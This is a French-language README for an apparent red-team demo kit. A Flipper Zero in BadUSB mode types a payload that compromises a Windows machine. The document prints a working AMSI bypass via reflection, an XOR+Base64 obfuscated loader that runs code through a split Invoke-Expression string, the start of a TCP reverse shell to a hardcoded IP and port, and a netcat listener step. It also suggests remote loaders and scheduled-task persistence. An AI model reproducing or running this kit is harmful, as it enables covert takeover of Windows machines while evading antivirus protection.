
# Reverse Shell PowerShell - Démo Red Team avec Flipper Zero (BadUSB)

Ce projet contient tout le nécessaire pour effectuer une démonstration réaliste de compromission Windows via **Flipper Zero en mode BadUSB**, à l'aide d'un **reverse shell PowerShell chiffré** et d'un **bypass Windows Defender (AMSI)**.

---

## 📁 Structure des fichiers

### 1. `reverse.ps1` – Reverse Shell brut
Ce script PowerShell contient un **reverse shell TCP** en clair, avec ton IP et ton port en dur. Il sera chiffré avant exécution pour éviter d'être détecté.

Exemple :
```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.198.141',9001);
$stream = $client.GetStream();
...
```

### 2. `encode.ps1` – Script d’encodage XOR + Base64
Ce script lit `reverse.ps1`, chiffre le contenu en **XOR (clé 23)**, puis l’encode en **Base64**.

Il génère une variable `$e = '...'` que tu peux coller dans ton script d'injection Flipper.

Exécution :
```powershell
.\encode.ps1
```

Il copie automatiquement le bloc final dans le presse-papiers.

---

### 3. `flipper-payload.txt` – Script injecté par Flipper Zero
Ce fichier est injecté via le module BadUSB du Flipper. Il simule une saisie clavier pour :

- Ouvrir PowerShell
- **Bypasser AMSI (anti-malware Windows)**
- Déchiffrer et exécuter le reverse shell en mémoire

**Contenu injecté (simplifié)** :
```powershell
# Bypass AMSI
$a=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");
$f=$a.GetField("amsiInitFailed","NonPublic,Static");
$f.SetValue($null,$true);

# Déchiffrement et exécution du shell
$k=23;
$e='TON_BLOC_BASE64';
$b=[Convert]::FromBase64String($e);
$d=$b|%{$_-bxor$k};
$s=[System.Text.Encoding]::UTF8.GetString($d);
$iex='I'+'nv'+'oke-Exp'+'ression';
&($iex) $s;
```

> Chaque ligne est découpée avec `STRING` et `ENTER` pour contourner la limite de caractères du champ `Windows+R`.

---

## 🛡️ Contournement de Windows Defender

Windows Defender (et AMSI) détecte et bloque :

- `Invoke-Expression`
- Les reverse shells classiques
- Les commandes trop visibles en clair

✅ **Ce projet contourne AMSI** via un accès en réflexion :

```powershell
$a = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
$f = $a.GetField("amsiInitFailed", "NonPublic,Static")
$f.SetValue($null, $true)
```

Ce contournement désactive la détection AMSI uniquement dans la session PowerShell active.

---

## 🚀 Démonstration recommandée

1. Préparer ton fichier `reverse.ps1` avec ton IP & port
2. Lancer `encode.ps1` → récupère le bloc Base64
3. Intègre le bloc dans `flipper-payload.txt`
4. Ouvre un terminal sur ta machine d'écoute :
   ```bash
   nc -lvnp 9001
   ```
5. Branche le Flipper → Injection → Connexion entrante 📡

---

## 📌 Remarques

- Le payload est **100% local** → pas de téléchargement de script en clair
- Compatible Windows 10/11 avec PowerShell ≥ 5.1
- Peut être modifié pour un loader distant ou une persistance via Task Scheduler

---

## 🔐 À utiliser exclusivement dans un cadre pédagogique, légal ou autorisé.
